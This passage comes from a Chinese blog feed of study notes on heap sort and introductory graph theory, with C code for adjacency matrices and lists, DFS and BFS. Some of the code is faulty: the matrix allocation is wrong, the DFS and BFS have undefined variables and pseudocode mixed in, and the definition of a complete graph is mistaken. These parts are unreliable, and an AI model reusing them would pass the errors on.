将数组调整成堆</h3><p>建立堆的一个简单的方法是把n个输入元素放入一个空堆中。我们这里把元素直接存入一个数组，再把数组中的元素调整成堆。</p><p>首先我们考虑叶子节点。因为叶子节点无论如何都满足堆的性质，所以我们只需要关注非叶子节点的顺序。如何找到非叶子节点呢？我们知道最后一个叶子节点必然在h-&gt;count-1位置上，所以我们可以直接找到最后一个叶子节点的双亲来找到第一个非叶子节点，再对每一个非叶子节点应用向下渗透调整堆就可以了。</p><p>具体的代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BuildHeap</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> A[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n&gt;h-&gt;capacity)</span><br><span class="line">        ResizeHeap(h);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[i]=A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    h-&gt;count=n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = (n<span class="number">-1</span>)/<span class="number">2</span>; i &gt;=<span class="number">0</span> ; i--) &#123;</span><br><span class="line">        PercolateDown(h,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序"><a class="markdownIt-Anchor" href="#堆排序"></a> 堆排序</h3><p>堆排序算法是排序算法中一个较为优秀的算法，它的时间复杂度只有O(n·log<sub>n</sub>)。</p><p>堆排序算法从一个无序数组中插入所有的元素进入堆中，然后再从元素的根节点处不断的删除元素直到堆为空为止。实际上就是把一个数组调整为堆，然后不断的按照出队最大元素/最小元素来进行排序。</p><p>堆排序也可以通过数组实现。此时不是删除元素，而是通过交换第一个元素和最后一个元素，并减小堆大小来实现。然后我们对第一个元素再进行堆调整，持续这个过程直到堆中只剩下一个元素为止。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Heapsort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> n,<span class="type">int</span> heap_type)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Heap</span>*<span class="title">h</span>=</span> CreatHeap(n,heap_type);</span><br><span class="line">    <span class="type">int</span> old_size,i,temp;</span><br><span class="line">    BuildHeap(h,A,n);</span><br><span class="line">    old_size=h-&gt;count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = n<span class="number">-1</span>;  i&gt;<span class="number">0</span> ; i--) &#123;</span><br><span class="line">        <span class="comment">//h-&gt;array[0]是最大的元素</span></span><br><span class="line">        temp=h-&gt;<span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[<span class="number">0</span>]=h-&gt;<span class="built_in">array</span>[h-&gt;count<span class="number">-1</span>];</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[h-&gt;count<span class="number">-1</span>]=temp;</span><br><span class="line">        h-&gt;count--;</span><br><span class="line">        PercolateDown(h,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    h-&gt;count=old_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么堆和优先队列的学习到这里就结束啦！</p><p>PS：这本书的漏洞真的一大堆，部分地方数字标错了也就算了，有些算法根本就跑不通，还得我手动校正……</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/River%20&amp;%20Faye%203.jpg" alt="River &amp; Faye 3" /></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 优先队列 </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构什锦（六）——走近图论</title>
      <link href="/posts/c8939c4977d0/"/>
      <url>/posts/c8939c4977d0/</url>
      
        <content type="html"><![CDATA[<h2 id="序言"><a class="markdownIt-Anchor" href="#序言"></a> 序言</h2><p>让我们从一个题目开始图的学习。</p><h3 id="哥尼斯堡桥问题"><a class="markdownIt-Anchor" href="#哥尼斯堡桥问题"></a> 哥尼斯堡桥问题</h3><blockquote><p>18世纪初普鲁士的哥尼斯堡，有一条河穿过，河上有两个小岛，有七座桥把两个岛与河岸联系起来（如概述图）。有个人提出一个问题：一个步行者怎样才能不重复、不遗漏地一次走完七座桥，最后回到出发点。</p></blockquote><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20231130163839.png" alt="20231130163839" /></p><p>大数学家<a href="https://baike.baidu.com/item/%E6%AC%A7%E6%8B%89?fromModule=lemma_inlink">欧拉</a>把它转化成一个几何问题——<a href="https://baike.baidu.com/item/%E4%B8%80%E7%AC%94%E7%94%BB%E9%97%AE%E9%A2%98?fromModule=lemma_inlink">一笔画问题</a>。他用顶点来表示各个陆地区域，用边表示桥，并以此建模画出了一个<strong>图</strong>。他不仅解决了此问题，且给出了连通图可以一笔画的充要条件是：奇点的数目不是0个就是2个（连到一点的数目如果是奇数条，就称为奇点；如果是偶数条，就称为偶点。要想一笔画成，必须中间点均是偶点，也就是有来路必有另一条去路，奇点只可能在两端。因此任何图能一笔画成，奇点要么没有，要么在两端）</p><p>由此，图论和几何拓扑正式诞生了。</p><h2 id="图的定义"><a class="markdownIt-Anchor" href="#图的定义"></a> 图的定义</h2><p>一个图由非空的顶点集合V和一个描述顶点之间关系（边或弧）的集合VR组成。</p><p>如G＝(V,VR)，V=(v1,v2,v3,v4,v5)，VR=((v1,v2),(v3,v4),(v5,v1))。</p><p>图又分为<strong>有向图</strong>和<strong>无向图</strong>，简单的来说就是边是否有向。是只能由一个顶点单向到达另一个顶点，还是两边都可以到达对方。一般用箭头和直线来加以区分，在VR中则分别用括号（有向）和尖括号&lt;无向&gt;来加以区分。<strong>完全有向图</strong>和<strong>完全无向图</strong>指的是任意一点都有一条路径到达图上其他任意一点的图。</p><p>顶点又有<strong>度</strong>，<strong>入度</strong>，和<strong>出度</strong>的概念。与一个顶点相关联的边的数目叫做度，，以该起点为终点的边到的数目叫做入度，以该顶点为起点的边的数目叫做出度。</p><p><strong>路径</strong>与<strong>路径长度</strong>的定义和树相同。若一条路径的起点和终点都是同一个点，就称为<strong>回路</strong>。如果路径中的顶点不重复出现，就叫做<strong>简单路径</strong>。如果除了起点和终点相同外其余顶点不重复，就是<strong>简单回路</strong>。</p><p>如果一个图的顶点和对应关系都是另一个图对应的子集，那么这个图就是另一个图的<strong>子图</strong>。</p><p>若图中有一条路径是独立的，无法通过另一部分路径到达，就说它不<strong>连通</strong>，否则就是<strong>连通图</strong>。无向图的极大连通子图称为的<strong>连通分量</strong>( Connected Component)。任何连通图的连通分量只有一个，即是其自身，非连通的无向图有多个连通分量</p><p><strong>生成树</strong>是指连通图G包含全部n个顶点的一个极小连通子图。对于该生成树任意加上一条原图的边则必然出现回路，任意减少一条边则必定非连通。</p><h2 id="图的储存方式"><a class="markdownIt-Anchor" href="#图的储存方式"></a> 图的储存方式</h2><p>图的储存方式有几种。这里将重点介绍邻接矩阵，邻接表两种方法。十字链表法和邻接多重表则只作为拓展了解即可。</p><p>在开始之前我们先强调一点。任何数据结构的意义都在于“快”，也就是将其运用于实际生产中追求计算机处理效率最大化。而我们程序员所需要的处理操作无非也就四种：<em><strong>增、删、查、改</strong></em>。我们讨论的任何优缺点都是基于这四种操作之上的情况的。</p><p>那么话不多说正式开始吧。</p><h3 id="领接矩阵"><a class="markdownIt-Anchor" href="#领接矩阵"></a> 领接矩阵</h3><p>现在假设有顶点i与j，我们定义一个矩阵A来储存图。当两个顶点i、j是连通的，就定义A[i][j]=1；否则定义此处为0。如果是无向图，那么也有A[j][i]=1。一般为了节省储存空间，我们只操作一半的矩阵就好。如果是带权图，就把1修改为权重w<sub>ij</sub>。</p><p>我们定义邻接矩阵的结构如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> V;<span class="comment">//顶点 Vertices</span></span><br><span class="line">    <span class="type">int</span> E;<span class="comment">//边 Edges</span></span><br><span class="line">    <span class="type">int</span> **Adj;<span class="comment">//表示二维矩阵</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再考虑一下实现方式，为了方便起见，我们可以先读入顶点的名称，然后再读取顶点对的名字（也就是边）。下面是实现的代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Graph*<span class="title function_">adjMatrixOfGraph</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//读取无向图的领接矩阵</span></span><br><span class="line">    <span class="type">int</span> i,u,v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>*<span class="title">G</span>=</span> (<span class="keyword">struct</span> Graph*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> Graph));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!G)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;Number of Vertices:%d, Number of Edges:%d&quot;</span>,&amp;G-&gt;V,&amp;G-&gt;E);<span class="comment">//输入顶点数和边数</span></span><br><span class="line">    G-&gt;Adj= <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="type">int</span>)*G-&gt;V*G-&gt;V);<span class="comment">//创建矩阵</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (u = <span class="number">0</span>; u &lt; G-&gt;V; ++u) &#123;</span><br><span class="line">        <span class="keyword">for</span> (v = <span class="number">0</span>; v &lt; G-&gt;V; ++v) &#123;</span><br><span class="line">            G-&gt;Adj[u][v]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//初始化矩阵</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;Reading Edges:%d %d&quot;</span>,&amp;u,&amp;v);</span><br><span class="line">        G-&gt;Adj[u][v]=<span class="number">1</span>;</span><br><span class="line">        G-&gt;Adj[v][u]=<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="comment">//读取边的信息</span></span><br><span class="line">    <span class="keyword">return</span> G;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>领接矩阵的优点是在判断顶点间的关系时可以实现随机读取，时间复杂度为O(1)。但缺点是如果要确定边和点的数目，就必须要遍历完整个矩阵。除此之外，还有储存空间开销大，删除顶点、边不方便等问题。</p><h3 id="邻接表"><a class="markdownIt-Anchor" href="#邻接表"></a> 邻接表</h3><p>邻接表是一个链式储存结构。在邻接表中，每一个顶点都建立一个链表，第i个单链表中的节点表示依附于顶点v<sub>i</sub>的所有边。</p><p>我们给出邻接表的定义。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> vertexNumber;<span class="comment">//储存节点的名字</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">next</span>;</span><span class="comment">//指向它连接的顶点表示边</span></span><br><span class="line">    <span class="comment">//OtherInfo info;  //和边相关的信息，权重啥的</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> V;<span class="comment">//顶点的数目，用于创建单链表计数</span></span><br><span class="line">    <span class="type">int</span> E;<span class="comment">//边的数目，用于读入数据计数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">Adj</span>;</span><span class="comment">//指向链表的头指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>基本上就是给定了一个图，包含顶点和边的数量以及依据这两个数据指向的一个邻接表，表的节点则储存顶点本身的信息以及指向它所连接的另一个顶点（也是一个节点结构）。邻接表中单链表的最后一个节点总是指向该顶点的邻接表本身。如果该顶点仅有头节点，也就是不与任何其他顶点连接，那么此时该节点的指针指向自己。</p><p>下面给出生成邻接表具体的代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Graph* <span class="title function_">adjListOfGraph</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, x, y;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>* <span class="title">G</span> =</span> (<span class="keyword">struct</span> Graph*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Graph));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!G) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of Vertices:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;G-&gt;V);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of Edges:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;G-&gt;E);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    G-&gt;Adj = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode) * G-&gt;V);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">        <span class="comment">//初始化邻接表</span></span><br><span class="line">        <span class="comment">//G-&gt;Adj[i]= (struct ListNode*)malloc(sizeof (struct ListNode));</span></span><br><span class="line">        G-&gt;Adj[i].vertexNumber = i;</span><br><span class="line">        G-&gt;Adj[i].next = &amp;(G-&gt;Adj[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d个顶点的名称为：\n&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,G-&gt;Adj[i].name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reading Edges:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reading Weight:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;weight);</span><br><span class="line">        <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        temp = (<span class="keyword">struct</span> ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        temp-&gt;vertexNumber = y;</span><br><span class="line">        temp-&gt;next = (G-&gt;Adj[x].next);<span class="comment">//临时节点指向第x条单链表，也就是第x个顶点，且采用头插法</span></span><br><span class="line">        temp-&gt;dis = weight;<span class="comment">//写入权重</span></span><br><span class="line">        G-&gt;Adj[x].next = temp;<span class="comment">//指向临时节点</span></span><br><span class="line"></span><br><span class="line">        temp = (<span class="keyword">struct</span> ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        temp-&gt;vertexNumber = x;</span><br><span class="line">        temp-&gt;next = (G-&gt;Adj[y].next);</span><br><span class="line">        temp-&gt;dis = weight;</span><br><span class="line">        G-&gt;Adj[y].next = temp;</span><br><span class="line">        <span class="comment">//最后的效果就是x单链表指向y，y单链表指向x</span></span><br><span class="line">        <span class="comment">//也就是说，这是个无向图，如果有向，把第二部分去掉就好</span></span><br><span class="line">        <span class="comment">//本题要求有向，故删去第二部分</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> G;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后实现的效果如图所示。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/v2-09bd69e515de6332571f48cfd2b27cac_b.jpg" alt="img" /></p><p>虽然储存空间相对邻接矩阵已经小了很多，计算图的度也十分方便，即便如此邻接表也是有缺陷的。比如我们要实现删除一个节点的功能，虽然直接删除掉该节点对应的单链表很简单，但是还需要修改其他顶点的链表删除和指定节点的连接。这种操作带来的麻烦与风险性不言而喻。</p><h3 id="十字链表"><a class="markdownIt-Anchor" href="#十字链表"></a> 十字链表</h3><blockquote><p>回忆邻接矩阵与邻接表的存储结构，它们都不便于求顶点的出度与入度（对于每个顶点而言，欲求其出入度，邻接矩阵需要扫描2*n次，而邻接表只易在求解其出度，欲求入度还需重新扫面整张图）。为了解决上述两者求出入度的局限性，在此引入十字链表，它可以看成邻接表与逆邻接表的结合，方便求解顶点出入度与获取顶点的出入度边。</p></blockquote><p>十字链表和邻接表还是有点区别的，实际上是邻接表和逆邻接表的结合。</p><p>十字链表的存储结构包含表头结点表与弧表，与邻接表类似，是一种顺序结合链式的存储结构，因此需要有两个指针域分别指向以顶点为弧尾和以顶点为弧头的弧结点。</p><p>表头结点表是一个顺序存储结构的数组，其结点数据类型如下图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/d6811dc195984c0f82387ea8e8391967.png" alt="img" /></p><p>它的顶点节点拥有一个data域储存和顶点相关的信息以及两条链域，分别指向以该顶点为弧头或弧尾的第一个弧节点。</p><p>弧结点的数据类型如下图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/51d7ffbdcc6d467485967deb78ba438d.png" alt="img" /></p><p>弧尾结点存储该弧尾结点所在图中的位置，弧头结点同理；弧上信息指示权值等弧数据；hlink指向与该弧有相同弧头的弧结点，tlink指向与该弧有相同弧尾的弧结点</p><p>结合这些给出十字链表的示意图：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/4f87bee55ba5485f8d9d892bbe4528f7.png" alt="img" /></p><p>更多资料可以参考：<a href="https://blog.csdn.net/QQ657205470/article/details/127361701?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%8D%81%E5%AD%97%E9%93%BE%E8%A1%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-127361701.nonecase&amp;spm=1018.2226.3001.4187">图的存储结构-十字链表_老攀呀的博客-CSDN博客</a>。</p><h3 id="邻接多重表"><a class="markdownIt-Anchor" href="#邻接多重表"></a> 邻接多重表</h3><p>邻接多重表是无向图的一种存储结构。如果在无向图中我们的侧重点在顶点上，那么使用邻接表是很合适的，然而之前我们讨论过，当我们的侧重点在边上，也就是需要对边增删查改的时候，用邻接多重表就更加合适了。</p><p>与十字链表一样，邻接多重表是由顶点集合和边集合构成的。但又与十字链表不同的是，邻接多重表是无向图的存储结构，而十字链表是针对有向图的。因为不考虑边的方向，所以和十字链表相比较，顶点结点只需要一个指针域指向所连接的边结点即可。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/048e5367b8e04499ab0d6d320310b78d.png" alt="img" /></p><p>顶点集VexNode由顶点的数据域data和指向<strong>顶点所连接的边节点的指针</strong>firstEdge构成。</p><p>而在边集中对于一条边来说，<strong>iVex</strong>和<strong>jVex</strong>是这一条边的连接的两个节点（Vi，Vj）在顶点集中的下标，headEdge和tailEdge分别是指向有着相同头、尾节点的<strong>边节点的指针</strong>。</p><p>更多资料可以参考：<a href="https://blog.csdn.net/bible_reader/article/details/71250117?ops_request_misc=%7B%22request%5Fid%22%3A%22170005094416800215025349%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=170005094416800215025349&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-71250117-null-null.142%5Ev96%5Epc_search_result_base5&amp;utm_term=%E9%82%BB%E6%8E%A5%E5%A4%9A%E9%87%8D%E8%A1%A8&amp;spm=1018.2226.3001.4187">【数据结构】邻接多重表_数据结构邻接多重表-CSDN博客</a>。</p><h2 id="图的遍历"><a class="markdownIt-Anchor" href="#图的遍历"></a> 图的遍历</h2><p>从图中任意一个顶点出发访问图的其他所有顶点且仅访问一次，这种行为就是图的遍历。</p><p>图的遍历通常有两种算法：</p><ol><li>深度优先搜索</li><li>广度优先搜索</li></ol><p>这两种算法都相当经典，值得深入学习。</p><h3 id="深度优先搜索depth-first-search-dfs"><a class="markdownIt-Anchor" href="#深度优先搜索depth-first-search-dfs"></a> 深度优先搜索/Depth First Search, DFS</h3><p>深度优先搜索（Depth-First Search，DFS）是十分常见的图搜索方法之一。深度优先搜索会沿着一条路径一直搜索下去。首先选取一个顶点作为起点，然后尝试访问连接的其他顶点。如果该节点没有被访问，就选取该节点继续重复上述过程，也就是成为一个新起点。如果该节点已经被访问过，就回退到之前的顶点。如果遇到“死胡同”，也就是在无法搜索时，那么就回退到刚刚访问过的节点，这个过程叫做<em>回溯</em>。当回溯到开始的顶点时，该过程终止。深度优先遍历按照深度优先搜索的方式对图进行遍历。并且每个节点只能访问一次。</p><p>深搜优先搜索的本质上就是持续搜索，遍历了所有可能的情况，必然能得到解。DFS搜索的流程是一个树的形式，每次一条路走到黑。</p><p>一般采用栈结构来辅助DFS的实现，但因为递归时利用的也是栈，所以一般用递归来实现DFS算法。将DFS用于二叉树，等价于使用前中后序遍历。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/af8af348f00409d2a3efc0ec3c7c0c73.gif" alt="img" /></p><p>基于此机制的算法实现如下：假设Visited是一个全局数组，用于记录顶点是否已经被访问过。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注：此处算法代码实现存疑，仅供参考</span></span><br><span class="line"><span class="type">int</span> Visited[G-&gt;V];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="keyword">struct</span> Graph*G,<span class="type">int</span> u)</span>&#123;</span><br><span class="line">    <span class="comment">/*如果用邻接矩阵的方法来表示图，那么该节点没有被访问过的条件是：</span></span><br><span class="line"><span class="comment">     if(!Visited[v]&amp;&amp;G-&gt;Adj[u][v])*/</span></span><br><span class="line">    Visited[u];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> v = <span class="number">0</span>; v &lt; G-&gt;V; ++v) &#123;</span><br><span class="line">        对u的每个尚未被访问过的邻接节点v<span class="comment">//也就是判断条件，这里未给出</span></span><br><span class="line">        &#123;</span><br><span class="line">            DFS(G,v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraversal</span><span class="params">(<span class="keyword">struct</span> Graph*G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">        Visited[i]=<span class="number">0</span>;<span class="comment">//把所有数组全部置零</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果图有不止一个连通分量，那么这个循环就是需要的</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!Visited[i])</span><br><span class="line">                DFS(G,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中第二个算法用于处理非连通图的情况。</p><p>需要强调的是，DFS算法并非是一种具体的算法，而是一种算法的思想，即通过设置一个判定条件以“不撞南墙不回头”的方式对图或者树进行搜索的方式。</p><h3 id="广度优先搜索算法breadth-first-search-bfs"><a class="markdownIt-Anchor" href="#广度优先搜索算法breadth-first-search-bfs"></a> 广度优先搜索算法/Breadth First Search, BFS</h3><p>也就是层次遍历，从上往下对每一层依次访问，在每一层中，从左往右（也可以从右往左）访问结点，访问完一层就进入下一层，直到没有结点可以访问为止。</p><p>一般用队列来实现BFS。将BFS用于二叉树，等价于使用层次遍历。或者说，层次遍历本就是借鉴了BFS算法。</p><p>我们令开始的顶点层数为0，BFS算法先访问最开始的顶点，然后访问第一层的所有顶点，即与开始的顶点距离为1的顶点。随后，再访问第二层的所有顶点。以此类推，直到所有的顶点都被访问。通常使用队列来储存每一层的顶点。</p><p>和DFS一样，我们使用一个全局数组来保存所有的顶点并预设为未访问，每个顶点被访问后就设为访问过。</p><p>具体的代码实现如下所示。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(<span class="keyword">struct</span> Graph*G,<span class="type">int</span> u)</span>&#123;</span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>*<span class="title">Q</span> =</span> CreateQueue();</span><br><span class="line">    EnQueue(Q,u);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(!IsEmptyQueue(Q))&#123;</span><br><span class="line">        u=DeQueue(Q);</span><br><span class="line">        Process u;<span class="comment">//操作，例如打印等</span></span><br><span class="line">        Visited[s]=<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/*如果用邻接矩阵的方法来表示图，那么该节点没有被访问过的条件是：</span></span><br><span class="line"><span class="comment">     if(!Visited[v]&amp;&amp;G-&gt;Adj[u][v])*/</span></span><br><span class="line">        对u的每个尚未被访问过的邻接节点v<span class="comment">//也就是判断条件，这里未给出</span></span><br><span class="line">        &#123;</span><br><span class="line">            EnQueue(Q,v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraversal</span><span class="params">(<span class="keyword">struct</span> Graph *G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;G-&gt;V;i++)</span><br><span class="line">        Visited[i]=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//如果图有不止一个连通分量，那么这个循环就是需要的</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!Visited[i])</span><br><span class="line">            BFS(G,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和DFS一样，BFS也是一种算法思想，并没有特定的模板。树的层次遍历就是BFS算法思想最好的具现化。</p><h2 id="图的算法问题集"><a class="markdownIt-Anchor" href="#图的算法问题集"></a> 图的算法问题集</h2><h3 id="连通性问题"><a class="markdownIt-Anchor" href="#连通性问题"></a> 连通性问题</h3><p>连通性问题，也就是找出一个图的生成树/极小连通子图。大致思想就是通过DFS或者BFS来遍历子图，然后再从一个未被访问的顶点继续遍历下一个连通分量，与图的遍历做法几乎相同。</p><p>通过图的遍历可以得到图的一棵或者多棵生成树。由深度优先搜索生成的树称为深度优先搜索树，广度优先搜索生成的树称为广度优先搜索树。</p><p>因为一个连通图对应的生成树不唯一，我们把生成树中所有边的权值之和称为<strong>代价</strong>，代价最小的生成树称为<strong>最小生成树</strong>。</p><p>比如我们要在n个城市间修建n-1条路线，如何在最节省经费的条件下建立这个通道？这个问题等价于在e条带权边选取n-1条边（不构成回路）来使权值最小。</p><p>那么如何构造最小生成树呢？我们引入两种算法。</p><h4 id="普里姆prim算法"><a class="markdownIt-Anchor" href="#普里姆prim算法"></a> 普里姆/Prim算法</h4><p>我这本参考书上实现Prim算法使用了优先队列，但是我还没有学习相关的数据结构，所以暂时用其他博客文章来代替理解。</p><p>可以参考这篇文章：<a 